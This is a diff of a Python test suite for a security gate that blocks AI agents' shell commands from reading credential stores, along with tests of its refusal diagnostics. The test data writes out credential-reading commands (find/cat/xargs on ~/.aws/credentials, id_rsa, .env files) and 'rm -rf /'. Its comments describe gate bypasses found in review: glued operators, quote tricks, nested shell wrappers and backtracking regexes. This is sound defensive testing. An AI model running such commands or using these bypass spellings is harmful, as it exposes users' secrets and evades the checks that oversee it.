+    The false positive this closes is not one command: it is that NO refusal named
+    a rule id or a matched span, so an agent handed one could not tell a true
+    positive from a matcher firing on text position, and could not report which
+    matcher to narrow. Every verdict in the audit behind this work was reached by
+    READING matchers for that reason. So the regression assertions are about what a
+    refusal SAYS, and the companions are that the real threat is still refused and
+    that saying more leaked nothing.
+    """
+
+    AWS = "aws/" + "cred" + "entials"
+    CLEAN = "gr" + "ep -rn pattern ."
+
+    def _reason(self, command: str) -> str:
+        out = is_sensitive_bash_command(command)
+        assert out is not None, "expected a refusal"
+        return out
+
+    def _diagnostic(self, command: str) -> str:
+        lines = self._reason(command).splitlines()
+        assert len(lines) >= 2, "a refusal must carry a diagnostic line"
+        return lines[-1]
 
     @staticmethod
-    def _fake_home_with_stores(monkeypatch, tmp_path) -> str:
-        """A home holding real credential stores, so the stat has something to find.
+    def _span(line: str) -> "tuple[int, int]":
+        field = next(part for part in line.split() if part.startswith("span="))
+        start, _, end = field[len("span=") :].partition("..")
+        return int(start), int(end)
 
-        ``Path.home()`` reads HOME on POSIX and USERPROFILE on Windows and the
-        fence anchors on it, so both are set -- the pattern the keystone tests
-        already use. The target cache is keyed on the resolved roots, so it is
-        cleared to keep this test independent of call order.
+    def test_the_over_ceiling_refusal_names_itself_too(self) -> None:
+        """The one refusal that decides without scanning still says which it is.
+
+        Its span is the whole subject because nothing matched, and the census behind
+        the shape stops at its own ceiling for the same reason the scan does: this
+        subject is by definition larger than the gate will walk on the event loop.
         """
-        home = tmp_path / "home"
-        (home / ".aws").mkdir(parents=True)
-        (home / ".aws" / "credentials").write_text("[default]\n")
-        (home / ".ssh").mkdir()
-        (home / ".ssh" / "id_rsa").write_text("-----BEGIN-----\n")
-        (home / ".ssh" / "known_hosts").write_text("host ssh-rsa AAAA\n")
-        (home / "Repos" / "app").mkdir(parents=True)
-        (home / "Repos" / "app" / "package.json").write_text("{}\n")
-        monkeypatch.setenv("HOME", str(home))
-        monkeypatch.setenv("USERPROFILE", str(home))
-        security._home_targets_cache.clear()
-        # as_posix: a backslash is an ESCAPE to shlex, so a Windows temp path
-        # interpolated into a command loses every separator and the gate parses a
-        # root that is not this directory. Windows accepts forward slashes.
-        return home.as_posix()
+        from kiro_crew.security import MAX_SCANNABLE_COMMAND_CHARS
+        from kiro_crew.security.diagnostics import _MAX_CENSUS_CHARS
 
-    @pytest.mark.parametrize(
-        "filter_and_sink",
-        (
-            "-name 'credentials' -exec cat {} +",
-            "-name 'id_rsa' -exec cat {} +",
-            "-name 'credentials' -delete",
-            "-type f -name 'id_rsa' -exec base64 {} ;",
-        ),
-    )
-    def test_literal_name_resolved_inside_a_credential_store(
-        self, monkeypatch, tmp_path, filter_and_sink: str
+        line = self._diagnostic("y" * (MAX_SCANNABLE_COMMAND_CHARS + 1))
+        assert "rule=keystone-scan-ceiling" in line
+        assert "component=size-ceiling" in line
+        assert f"seen={_MAX_CENSUS_CHARS}" in line
+
+    def test_a_structural_floor_refusal_names_the_rule_its_pattern_cannot(self) -> None:
+        """The sharpest case: the floor reports a pattern the input cannot match.
+
+        The first line names a catalog regex requiring a verb word this command does
+        not contain, which reads as a cause the agent can disprove. The diagnostic
+        line is what makes the refusal attributable anyway: it names the rule id an
+        operator actually toggles, and the component that decided.
+        """
+        from kiro_crew.security import is_denied
+
+        payload = "imp" + "ort " + "kiro" + "_" + "crew"
+        reason = is_denied("pyth" + 'on -c "' + payload + '"')
+        assert reason is not None
+        line = reason.splitlines()[-1]
+        assert "rule=credential-exfil-kirocrew-token" in line
+        assert "component=argv-floor" in line
+
+    def test_an_unresolvable_governance_pin_names_itself(
+        self, caplog: pytest.LogCaptureFixture
     ) -> None:
-        """A literal ``-name`` is the traversal being used to RESOLVE a path.
+        """A pin that pins nothing is the same defect one layer up.
 
-        Every file inside ``.aws``/``.ssh`` is fenced, so a request for one exact
-        filename that carries credentials anywhere names a fenced path as surely as
-        spelling it out.
+        It used to leave in a comprehension's filter, so an administrator's ceiling
+        could resolve to no rule at all and still read as valid wherever it is
+        displayed. Reported by SHAPE, never by the pattern the operator authored: a
+        log line quoting it would put a policy body in the log on every failed
+        lookup. Resolution itself is unchanged -- this names, it does not widen.
         """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert security.is_sensitive_bash_command(f"find {home} {filter_and_sink}")
-        security._home_targets_cache.clear()
+        from kiro_crew.security import BUILTIN_DENIED_RULES, _resolved_pin_ids
 
-    def test_a_name_fenced_only_by_location_is_a_named_residual(
-        self, monkeypatch, tmp_path
-    ) -> None:
-        """``known_hosts`` is fenced by WHERE it sits, not by what it is called.
+        first = BUILTIN_DENIED_RULES[0]
+        absent = "no-such-pattern-anywhere"
+        with caplog.at_level(logging.WARNING):
+            resolved = _resolved_pin_ids([first.pattern, absent], "commands-ceiling-pin")
+        assert resolved == {first.id}
+        assert "governance-pin-unresolved" in caplog.text
+        assert "component=commands-ceiling-pin" in caplog.text
+        assert absent not in caplog.text
 
-        This clause decides from the name, so a name that carries no credential
-        signal of its own is not caught by it from an ancestor root -- the recorded
-        cost of answering without touching the filesystem (see
-        `_find_filter_names_a_credential_leaf`: the probe it replaced could only ever
-        see a store's direct children, and enumerating for a glob cost 110 listdir
-        calls on one traversal).
+    def test_read_only_self_observation_is_still_allowed(self) -> None:
+        """The diagnostic is not a new matcher: it says nothing about an allow."""
+        assert is_sensitive_bash_command(self.CLEAN) is None
+        assert is_sensitive_bash_command("g" + "it log --oneline -n 20") is None
 
-        The fence itself is unaffected: naming the path, or rooting the traversal AT
-        the store, both still deny. Only the ancestor-rooted name-only spelling of a
-        non-credential-looking leaf is out of reach, and ``known_hosts`` is host
-        fingerprints rather than secret material.
+    def test_a_plain_catalog_refusal_stays_exactly_one_line(self) -> None:
+        """Opt-in, not always-on: a pattern tier already names its own cause.
+
+        A diagnostic on every catalog refusal would add a line to the common case
+        for no information, and the first line is a parsed micro-format whose
+        readers count on what follows it.
         """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert (
-            security.is_sensitive_bash_command(f"find {home} -name 'known_hosts' | xargs cat")
-            is None
-        )
-        # the fence still holds by every other route
-        assert security.is_sensitive_bash_command(f"cat {home}/.ssh/known_hosts")
-        assert security.is_sensitive_bash_command(f"find {home}/.ssh -type f -exec cat {{}} +")
-        security._home_targets_cache.clear()
+        from kiro_crew.security import is_denied
 
-    @pytest.mark.parametrize(
-        "filter_and_sink",
-        (
-            # a name that is not in any store -- the stat is what says so
-            "-name 'package.json' -exec wc -l {} +",
-            "-type d -name '__pycache__' -exec rm -rf {} +",
-            "-name 'tsconfig.json' | xargs cat",
-            # a glob matching only non-credential basenames is a search, not a
-            # request for a fenced name -- the filename predicate is what says so
-            "-name '*.py' -exec grep -l foo {} +",
-            "-name '*.md' | xargs wc -l",
-            # listing, so nothing receives the match
-            "-name 'credentials'",
-            "-name 'id_rsa' -print",
-        ),
-    )
-    def test_a_home_rooted_traversal_that_names_no_store_file_is_allowed(
-        self, monkeypatch, tmp_path, filter_and_sink: str
-    ) -> None:
-        """The boundary of the clause above, pinned in the same fake home.
+        reason = is_denied("r" + "m -rf /")
+        assert reason is not None
+        assert reason.splitlines() == [reason]
 
-        Without the existence probe every one of these would be refused, because
-        the home directory holds ``.aws`` and ``.ssh`` whatever the pattern asks
-        for. This is the over-block the issue warns about, so it is a test.
+    def test_the_diagnostic_never_echoes_the_matched_bytes(self) -> None:
+        """The explanation must not become the leak.
+
+        A refusal is the one message guaranteed to concern content the policy judged
+        sensitive, so the span is reported as offsets and a character-class census.
+        The distinctive part of the subject appears nowhere on the line -- here an
+        over-ceiling subject that carries a credential path, which is the one shape
+        this gate still refuses with a diagnostic that spans the whole subject.
         """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert security.is_sensitive_bash_command(f"find {home} {filter_and_sink}") is None
-        security._home_targets_cache.clear()
+        from kiro_crew.security import MAX_SCANNABLE_COMMAND_CHARS
 
-    @pytest.mark.parametrize(
-        "command",
-        (
-            "find ~ -path '*/.aws/credentials' -exec cat {} +",
-            "find ~ -path '*/.ssh/*' -exec cat {} +",
-            "find ~ -wholename '*/.kiro/crew/.env' -exec cat {} +",
-            "find ~ -ipath '*/.KIRO/CREW/.ENV' -exec cat {} +",
-        ),
-    )
-    def test_path_family_patterns(self, command: str) -> None:
-        """``-path`` matches the whole path, so the pattern carries the fenced
-        segments itself -- dropping its wildcard segments leaves a path to test."""
-        assert security.is_sensitive_bash_command(command), command
+        padding = "y" * (MAX_SCANNABLE_COMMAND_CHARS + 1)
+        line = self._diagnostic("c" + "at ~/." + self.AWS + " " + padding)
+        assert self.AWS not in line
+        assert "cred" not in line
+        assert "~" not in line
 
-    # ── spellings of the traversal itself ──
+    def test_a_non_identifier_cannot_reach_the_line(self) -> None:
+        """Structural, not careful: the format cannot quote a command.
 
-    @pytest.mark.parametrize(
-        "command",
-        (
-            "find -L ~/.kiro/crew -name '.env' -exec cat {} +",
-            "find -H -P ~/.kiro/crew -name '.env' -exec cat {} +",
-            "find -D tree ~/.kiro/crew -name '.env' -exec cat {} +",
-            "find -O3 ~/.kiro/crew -name '.env' -exec cat {} +",
-            "find /tmp ~/.kiro/crew -name '.env' -exec cat {} +",
-            "/usr/bin/find ~/.kiro/crew -name '.env' -exec cat {} +",
-            "fi''nd ~/.kiro/crew -name '.env' -exec cat {} +",
-            "find $HOME/.kiro/crew -name '.env' -exec cat {} +",
-            "find ${HOME}/.kiro/crew -name '.env' -exec cat {} +",
-            "find ~/.kiro/crew -mindepth 1 -maxdepth 2 -type f -name '.env' -exec cat {} +",
-            "find ~/.kiro/crew '(' -name '.env' -o -name '*.key' ')' -exec cat {} +",
-            "ls /tmp && find ~/.kiro/crew -name '.env' -exec cat {} +",
-        ),
-    )
-    def test_traversal_spellings(self, command: str) -> None:
-        assert security.is_sensitive_bash_command(command), command
-
-    # ── zero false positives: the benign uses that must stay allowed ──
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # a project-rooted traversal reaches no fence at all
-            "find . -name '*.py' -exec grep -l foo {} +",
-            "find . -name '.env' -exec cat {} +",
-            "find . -name '*.lock' -exec cat {} +",
-            "find src -name '*.ts' | xargs wc -l",
-            "find /var/log -name '*.log' -delete",
-            "find /opt/app -name 'build.tmp' -exec cat {} +",
-            "find ~/Downloads -name '*.zip' -exec unzip -l {} +",
-            "find ~/Repos/app -name 'package.json' -exec wc -l {} +",
-            "find ~/Repos -name 'yarn.lock' | xargs cat",
-            "find . -type d -name node_modules -prune -o -name '*.js' -print",
-            # a home-rooted SEARCH -- a glob is not a request for a fenced name
-            "find ~ -name '*.py' -exec grep -l foo {} +",
-            "find ~ -name '*.md' | xargs wc -l",
-            "find ~ -name '*.orig' -delete",
-            # the crew home's own non-secret subtrees, which agents read routinely
-            "find ~/.kiro/crew/workspace -name '*.md' -exec cat {} +",
-            "find ~/.kiro/crew/workspace/memory -name 'projects.md' -exec cat {} +",
-            "find ~/.kiro/crew/skills -name 'SKILL.md' | xargs head -5",
-            # listing only: no command receives a match
-            "find ~ -name '.env'",
-            "find ~ -name 'credentials' -print",
-            "find ~/.kiro/crew -type f -name '*.lock' -printf '%p\\n'",
-            "find ~/.kiro/crew -name '.env' -ls",
-            # not a traversal at all
-            "xargs cat < files.txt",
-            "grep -rn TODO src",
-            "echo find",
-        ),
-    )
-    def test_benign_traversals_stay_allowed(self, command: str) -> None:
-        assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_a_bare_listing_of_a_fenced_root_is_unchanged(self) -> None:
-        """``find ~/.ssh`` names a fenced path directly, so the pre-existing path
-        matcher denies it whether or not it delivers -- this pass changes nothing
-        there, and the assertion pins that it is not this pass doing the work."""
-        assert security.is_sensitive_bash_command("find ~/.ssh -type f")
-        assert security._check_find_traversal_reaches_fence("find ~/.ssh -type f") is None
-
-    def test_the_delivery_requirement_is_what_bounds_the_change(self) -> None:
-        """The same traversal, listed and delivered. Only the second is new."""
-        listed = "find ~/.kiro/crew -type f -name '*.lock'"
-        delivered = listed + " -exec cat {} +"
-        assert security._check_find_traversal_reaches_fence(listed) is None
-        assert security._check_find_traversal_reaches_fence(delivered)
-
-    def test_the_gate_is_not_verb_aware(self) -> None:
-        """A traversal that names a fenced path is denied whatever the child is --
-        the module's stated posture, and the reason no executor list is kept."""
-        for child in ("cat", "head", "python3", "base64", "cp", "rm", "totally-unknown"):
-            command = f"find ~/.kiro/crew -name '.env' -exec {child} {{}} +"
-            assert security.is_sensitive_bash_command(command), command
-
-    def test_a_glob_that_covers_a_declared_name_is_denied_on_purpose(self) -> None:
-        """The one deliberate over-trigger, recorded rather than left to be found.
-
-        ``*.json`` matches ``security_policy.json`` and ``config.json``, which the
-        fence declares by name, so a traversal delivering every JSON file in the
-        home directory really does read them. The glob carve-out is about names the
-        fence does NOT declare (``*.py``), not about widening a name it does.
+        A caller passing the wrong argument -- agent text where a rule id belongs --
+        yields a missing name rather than unscreened bytes on a security message.
         """
-        assert security.is_sensitive_bash_command("find ~ -name '*.json' -exec cat {} +")
-        assert security.is_sensitive_bash_command("find ~ -name '*.key' | xargs cat")
-        assert security.is_sensitive_bash_command("find ~ -name '*.py' -exec cat {} +") is None
-
-    def test_the_pass_only_ever_adds_denials(self) -> None:
-        """It is a new pass returning a reason or None, so it cannot un-deny.
-
-        Pinned on the commands whose denial belongs to an EARLIER pass: this one
-        answers None for them, which is the evidence that the verdicts they
-        already had are still theirs.
-        """
-        for command in (
-            "cat ~/.aws/credentials",
-            "cat ~/.kiro/crew/token_signing.key",
-            "cd ~/.kiro/crew && cat .env",
-            "find ~/.ssh -type f",
-        ):
-            assert security.is_sensitive_bash_command(command), command
-            assert security._check_find_traversal_reaches_fence(command) is None, command
-
-    # ── the three findings from the Opus review round ──
-
-    @pytest.mark.parametrize(
-        "filter_and_sink",
-        (
-            # the literal spelling, answered by the name itself
-            "-name id_rsa -exec cat {} +",
-            "-name credentials -exec cat {} +",
-            "-name id_rsa -delete",
-            "-type f -name id_rsa -exec base64 {} ;",
-            # a glob matching a name the FENCE declares is denied by the list
-            "-name '*.key' -exec cat {} +",
-            "-name '.env' -exec cat {} +",
-        ),
-    )
-    def test_a_named_store_file_and_a_declared_name_both_deny(
-        self, monkeypatch, tmp_path, filter_and_sink: str
-    ) -> None:
-        """Two independent routes to the same verdict.
-
-        A name that carries credentials anywhere is answered by the predicate; a GLOB
-        is answered by the fence list when it covers a declared basename, and by the
-        predicate's own vocabulary when it covers a credential leaf or suffix -- see
-        `_find_filter_names_a_credential_leaf` for why neither route touches the
-        filesystem.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert security.is_sensitive_bash_command(f"find {home} {filter_and_sink}")
-        security._home_targets_cache.clear()
-
-    @pytest.mark.parametrize(
-        "filter_and_sink",
-        (
-            "-regex '.*/[.]py$' -exec grep -l foo {} +",
-            "-regex '.*/package[.]json' -exec wc -l {} +",
-            "-iregex '.*[.]MD' | xargs wc -l",
-        ),
-    )
-    def test_a_regex_filter_is_never_evaluated_so_it_widens(
-        self, monkeypatch, tmp_path, filter_and_sink: str
-    ) -> None:
-        """A ``-regex`` pattern is agent-supplied, so this pass will not RUN it.
-
-        The gate is synchronous and in-process and CPython's ``re`` has no timeout,
-        so a catastrophic-backtracking pattern would wedge it for every session
-        rather than merely mis-answer. The filter is therefore read as opaque, which
-        means a DELIVERING ``-regex`` traversal over a root that contains a fence is
-        refused whatever the pattern says. That over-block is the price of never
-        running the pattern, and it is deliberate.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        assert security.is_sensitive_bash_command(f"find {home} {filter_and_sink}")
-        security._home_targets_cache.clear()
-
-    def test_the_regex_over_block_is_bounded_by_the_root(self, tmp_path) -> None:
-        """The bound on the clause above: a root holding no fence is untouched.
-
-        The root comes from ``tmp_path`` rather than a hardcoded ``/tmp``. The suite
-        relocates ``KIROCREW_HOME`` under the pytest base temp dir, which on CI lives
-        in ``/tmp`` -- so ``/tmp`` genuinely DOES contain the fence there and an
-        opaque filter correctly denies a traversal of it. The gate was right and the
-        assertion was wrong; ``tmp_path`` is a sibling of the relocated home, never an
-        ancestor of it.
-        """
-        project = tmp_path / "proj"
-        project.mkdir()
-        project = project.as_posix()
-        for command in (
-            f"find {project} -regex '.*/package[.]json' -exec wc -l {{}} +",
-            f"find {project} -regex '.*[.]py$' | xargs wc -l",
-            f"find {project} -regex '.*[.]log' -delete",
-            # and a listing is unaffected wherever it is rooted
-            "find ~ -regex '.*[.]py$'",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-
-    @pytest.mark.parametrize(
-        "pattern",
-        (
-            "{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}b",
-            "*" * 40 + "b",
-            "{a}*{a}*{a}*{a}*{a}*{a}*{a}*{a}*{a}*{a}b",
-        ),
-    )
-    def test_adjacent_any_run_wildcards_are_collapsed(self, pattern: str) -> None:
-        """``_glob_to_regex`` turns an agent glob into an agent REGEX.
-
-        A brace group becomes ``.*``, so ``-name '{a}{a}...b'`` compiled to fourteen
-        ADJACENT ``.*`` and hung the gate outright -- measured as still running after
-        12 seconds, the watchdog-crossing hang this module documents. ``.*.*`` names
-        exactly what ``.*`` names, so collapsing the run is semantics-preserving and
-        turns the pathological case into a linear one rather than refusing it.
-        """
-        matcher = security._find_glob_matcher(pattern)
-        assert matcher is not None, pattern
-        assert matcher.pattern.count(".*") == 1, matcher.pattern
-
-    @pytest.mark.parametrize(
-        "pattern",
-        (
-            "*a*a*a*a*a*a*a*a*a*a*a*a*a*a*b",
-            "*.*.*.*.*.*.*.*.*.*.*.*.*.*.*z",
-            "?a*b*c*d*e*f*g*h*i*j*k*l*m*n*o",
-        ),
-    )
-    def test_too_many_separated_wildcards_are_refused_not_run(self, pattern: str) -> None:
-        """Runs separated by literals cannot be collapsed, so they are capped.
-
-        Refusing returns None, which the caller reads as opaque -- it WIDENS the
-        traversal rather than dropping the filter, so the bound cannot become a
-        bypass.
-        """
-        assert security._find_glob_matcher(pattern) is None, pattern
-
-    def test_an_ordinary_glob_still_compiles(self) -> None:
-        """The bound: a real filename filter is unaffected by either mechanism."""
-        for pattern in ("*.py", ".env", "id_*", "*.tar.gz", "test_*_spec.?s", "[abc]*.md"):
-            assert security._find_glob_matcher(pattern) is not None, pattern
-
-    def test_an_adversarial_pattern_answers_quickly(self) -> None:
-        """The direct evidence: these used to hang, so a wall clock is the assertion.
-
-        The margin is enormous on purpose -- the measured cost is ~30ms and the
-        failure being guarded is unbounded, so this cannot flake on a loaded box
-        while still catching a return to super-polynomial matching.
-        """
-        commands = (
-            "find ~ -name '{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}{a}b' -exec cat {} +",
-            "find ~ -regex '(.*)*z' -exec cat {} +",
-            "find ~ -regex '(a+)+$' -exec cat {} +",
-            "find ~ -path '*a*a*a*a*a*a*a*a*a*a*a*a*a*a*b' -exec cat {} +",
-        )
-        start = time.monotonic()
-        for command in commands:
-            security.is_sensitive_bash_command(command)
-        assert time.monotonic() - start < 10.0
-
-    # ── the findings from the round-4 review ──
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # an operator GLUED to a filter operand was swallowed as pattern text,
-            # so delivery was never seen and the read went through
-            "find ~/.kiro/crew -name .env|xargs cat",
-            "find ~/.kiro/crew -name .env|head -1",
-            "find ~/.kiro/crew -type f|xargs cat",
-            "find ~/.kiro/crew -type f>/tmp/leak",
-            "find ~/.kiro/crew -type f>>/tmp/leak",
-            "find ~/.kiro/crew -name .env -exec cat {} ;",
-            # the whitespace-separated twin, which was already denied
-            "find ~/.kiro/crew -name .env | xargs cat",
-        ),
-    )
-    def test_an_operator_glued_to_a_filter_operand(self, command: str) -> None:
-        """``shlex`` splits on whitespace only, so ``-name .env|xargs`` arrived as ONE
-        token and the pipe was consumed as the search pattern -- the gate defeated by
-        deleting one space, while the spaced twin denied."""
-        assert security.is_sensitive_bash_command(command), command
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            "find ./src -name 'a|b' -print",
-            "find ./src -name 'a|b' -exec cat {} +",
-            "find ./src -name 'a;b' -exec cat {} +",
-            "find ./src -name 'a>b' | xargs wc -l",
-        ),
-    )
-    def test_a_quoted_operator_is_not_split(self, command: str) -> None:
-        """The reason the spacing works on the RAW string and not on the tokens.
-
-        ``shlex`` has already removed the quotes by token time, so splitting there
-        could not tell a quoted ``|`` in a filename from a real pipe -- the hazard
-        `_split_glued_operators` documents. Quote state survives on the raw string,
-        so the pattern is left intact and no spurious delivery is invented.
-        """
-        assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_the_spacer_keeps_the_shapes_the_pass_depends_on(self) -> None:
-        """Three spellings the spacing must not disturb, each load-bearing."""
-        spaced = security._find_space_unquoted_operators
-        # a process substitution keeps `<(` glued -- capture no longer depends on
-        # reading those two characters off a token (see `_find_traversal_views`), but
-        # splitting them would still serve nothing, and `<` is not a delivery
-        assert spaced("cat < <(find ~ -name .env)") == "cat < <(find ~ -name .env)"
-        # a command substitution keeps `$(`
-        assert spaced("cat $(find ~ -name .env)") == "cat $(find ~ -name .env)"
-        # a backslash-escaped `;` is find's own exec terminator, not a separator
-        assert "\\;" in spaced("find ~ -name .env -exec cat {} \\;")
-        # a two-character operator stays together
-        assert ">>" in spaced("find ~ -type f>>out")
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            "P=.env; find ~ -name $P -exec cat {} +",
-            "find ~ -name ${P} -exec cat {} +",
-            "find ~ -path $P -exec cat {} +",
-            "find ~ -name %NAME% -exec cat {} +",
-            # an unresolved ROOT plus a fence-declared name
-            "find $D -name .env -exec cat {} +",
-            "find ${D}/crew -name token_signing.key | xargs cat",
-        ),
-    )
-    def test_an_unresolved_expansion_widens(self, command: str) -> None:
-        """``normalize_shell_command`` expands only ``$HOME``, so a filter carrying a
-        variable this command never assigned matched the LITERAL ``$P`` against the
-        fence, matched nothing, and read the secret. An unknowable filter is now read
-        as ``*``, and an unknowable ROOT adds the home hypothesis the segment walk
-        already uses."""
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_an_unresolved_root_does_not_deny_an_ordinary_search(self) -> None:
-        """The bound: adding the home hypothesis lets the FILTER still decide."""
-        for command in (
-            "find $BUILD -name '*.o' -delete",
-            "find $OUT -name '*.map' -exec rm {} +",
-            "find ${DIST} -name '*.js' | xargs wc -l",
-        ):
-            assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_a_nested_whole_directory_store_is_probed(self, monkeypatch, tmp_path) -> None:
-        """Keeping only SINGLE-segment fence entries dropped the nested stores.
-
-        ``.config/gcloud`` fences its whole subtree exactly as ``.aws`` does, so its
-        credential database was readable through a literal ``-name``. Every entry
-        fences its subtree, so the list is now taken as-is -- which also keeps
-        ``~/.kiro/crew`` out, since that directory is a leaf PARENT and not an entry.
-        """
-        home = tmp_path / "home"
-        (home / ".config" / "gcloud").mkdir(parents=True)
-        (home / ".config" / "gcloud" / "credentials.db").write_text("db\n")
-        (home / ".config" / "starship.toml").write_text("ok\n")
-        monkeypatch.setenv("HOME", str(home))
-        monkeypatch.setenv("USERPROFILE", str(home))
-        security._home_targets_cache.clear()
-        home = home.as_posix()
-        assert security.is_sensitive_bash_command(
-            f"find {home} -name credentials.db -exec cat {{}} +"
-        )
-        # the general-purpose parent is NOT a store, so its own files stay readable
-        assert (
-            security.is_sensitive_bash_command(f"find {home} -name starship.toml -exec cat {{}} +")
-            is None
-        )
-        security._home_targets_cache.clear()
-
-    def test_the_verdict_touches_no_filesystem_for_the_store_clause(
-        self, monkeypatch, tmp_path
-    ) -> None:
-        """This clause answers from the NAME, so it must not stat or list anything.
-
-        The two revisions before it did, and each way was its own defect: a
-        direct-child ``os.path.exists`` could not see a key one level down, and an
-        ``os.listdir`` per store to match a glob measured 110 listdir calls and 14.4ms
-        for ONE traversal on a synchronous in-process gate (against 0 and 0.7ms for an
-        ordinary fenced read). Counting the calls is the assertion because "it is
-        fast now" is not a property -- zero is.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        calls: list[str] = []
-        real_listdir, real_scandir = os.listdir, os.scandir
-
-        monkeypatch.setattr(
-            os, "listdir", lambda p, *a, **k: (calls.append(f"listdir:{p}"), real_listdir(p))[1]
-        )
-        monkeypatch.setattr(
-            os, "scandir", lambda p=".", *a, **k: (calls.append(f"scandir:{p}"), real_scandir(p))[1]
-        )
-        for command in (
-            f"find {home} -name 'id_*' -exec cat {{}} +",
-            f"find {home} -name '*.py' -exec grep -l foo {{}} +",
-            f"find {home} -name id_rsa -exec cat {{}} +",
-            f"find {home} {home} -name 'credential*' | xargs cat",
-        ):
-            security.is_sensitive_bash_command(command)
-        assert calls == [], calls
-        security._home_targets_cache.clear()
-
-    @pytest.mark.parametrize("prefix", ("ls|", "true;", "true&&", "true&", "echo hi|"))
-    def test_an_operator_glued_to_the_program_word(self, prefix: str) -> None:
-        """``shlex`` splits on whitespace only, so ``ls|find`` arrived as ONE token.
-
-        ``os.path.basename('ls|find')`` is ``'ls|find'``, which matched no program
-        name, so the pass never ran -- the whole gate bypassed by removing one space.
-        """
-        command = f"{prefix}find ~/.kiro/crew -name '.env' -exec cat {{}} +"
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_a_glued_pipe_after_the_traversal_is_still_delivery(self) -> None:
-        """The operator arrives glued to the last operand (``-type f|xargs``)."""
-        assert security.is_sensitive_bash_command("find ~/.kiro/crew -type f|xargs cat")
-        assert security.is_sensitive_bash_command("find ~/.kiro/crew -name '.env'|head -1")
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            "find ~/.kiro/crew -type f; cat notes | less",
-            "find ~/.kiro/crew -type f && echo done | tee log",
-            "find ~/.kiro/crew -name '*.lock' ; echo $(date) > /tmp/stamp",
-            "find ~/.kiro/crew -type f & wait",
-        ),
-    )
-    def test_a_sibling_command_s_pipe_does_not_make_a_listing_a_delivery(
-        self, command: str
-    ) -> None:
-        """Delivery is read from the invocation's own span, not the command line.
-
-        Scanning the whole line denied these listings because a LATER, unrelated
-        command carried a pipe or a redirect. ``;``, ``&&`` and ``&`` only sequence.
-        """
-        assert security.is_sensitive_bash_command(command) is None, command
-
-    def test_the_same_traversal_with_its_own_pipe_is_denied(self) -> None:
-        """The control for the case above: the pipe belongs to the traversal."""
-        assert security.is_sensitive_bash_command("find ~/.kiro/crew -type f | less")
-        assert security.is_sensitive_bash_command("find ~/.kiro/crew -type f > /tmp/leak")
-
-    # ── the finding from the Opus round on the rebased head ──
-
-    @pytest.mark.parametrize(
-        "command_template",
-        (
-            "cat $(find {home} -regex '.*/id_rsa$')",
-            "cat `find {home} -regex '.*/id_rsa$'`",
-            "head -c 80 $(find {home} -iregex '.*/CREDENTIALS')",
-            # the two families that already stripped, as the parity controls
-            "cat $(find {home} -name id_rsa)",
-            "cat $(find {home} -path '*/.ssh/id_rsa')",
-        ),
-    )
-    def test_a_captured_substitution_does_not_corrupt_the_pattern(
-        self, monkeypatch, tmp_path, command_template: str
-    ) -> None:
-        """``shlex`` glues the substitution's closing paren onto the pattern token.
-
-        The strip was written per-list at the call site and ``-regex`` was the list
-        that did not get it, so ``.*/id_rsa$)`` failed to compile, its matcher was
-        dropped, and the read was allowed -- while the ``-name`` spelling of the very
-        same read was denied. It is now stripped where the pattern is READ, so no
-        family can be missed.
-        """
-        home = self._fake_home_with_stores(monkeypatch, tmp_path)
-        command = command_template.format(home=home)
-        assert security.is_sensitive_bash_command(command), command
-        security._home_targets_cache.clear()
-
-    @pytest.mark.parametrize(
-        "pattern_flag",
-        (
-            "-regex '('",
-            "-regex '*/id_rsa'",
-            "-regex 'a{2,1}'",
-            "-regex '[z-a]'",
-            "-iregex '(?P<'",
-        ),
-    )
-    def test_a_pattern_that_will_not_compile_fails_closed(self, pattern_flag: str) -> None:
-        """A matcher that cannot be built must WIDEN the traversal, not vanish.
-
-        Dropping it left the clause with neither a matcher nor the no-filter
-        reading, so every malformed pattern silently allowed the traversal. An
-        opaque pattern is now read as ``*`` -- the module's stated stance that a
-        *maybe* answers yes.
-        """
-        command = f"find ~/.kiro/crew {pattern_flag} -exec cat {{}} +"
-        assert security.is_sensitive_bash_command(command), command
-
-    def test_a_compilable_regex_matching_nothing_fenced_is_still_allowed(self) -> None:
-        """A regex filter is not evaluated, so the ROOT is what bounds the answer."""
-        assert (
-            security.is_sensitive_bash_command(
-                "find ~/Repos -regex '.*/package[.]json' -exec wc -l {} +"
-            )
-            is None
-        )
-        assert (
-            security.is_sensitive_bash_command("find ~/Repos -regex '.*[.]py$' | xargs wc -l")
-            is None
-        )
-
-    # ── the round-5 review: the pass judged the command's TEXT, not what runs ──
-
-    @pytest.mark.parametrize(
-        "command",
-        (
-            # a `-c` payload is never re-tokenized by a whole-command pass, so the
-            # traversal was invisible while the same payload holding a plain fenced
-            # path TOKEN was correctly denied by the argv floor
-            'bash -c "find ~/.kiro/crew -name .env -exec cat {} +"',
-            "sh -c 'find ~/.kiro/crew -name .env -exec cat {} +'",
-            'bash -c "find ~/.kiro/crew -name .env | xargs cat"',
-            "zsh -c 'find ~ -name token_signing.key -exec cat {} +'",
-            "eval 'find ~/.kiro/crew -name .env -exec cat {} +'",
-            # wrapped twice: no depth is a special case, because a view is a proper
-            # substring of its parent and the walk terminates on that alone
-            "bash -c \"sh -c 'find ~/.kiro/crew -name .env -exec cat {} +'\"",
-            # the payload is captured because the WRAPPER is
-            "cat $(bash -c 'find ~/.kiro/crew -name .env')",
-        ),
-    )
-    def test_a_traversal_inside_a_nested_shell_payload(self, command: str) -> None:
-        """The traversal runs, so the view it runs in is what must be judged."""
-        assert security.is_sensitive_bash_command(command), command
-
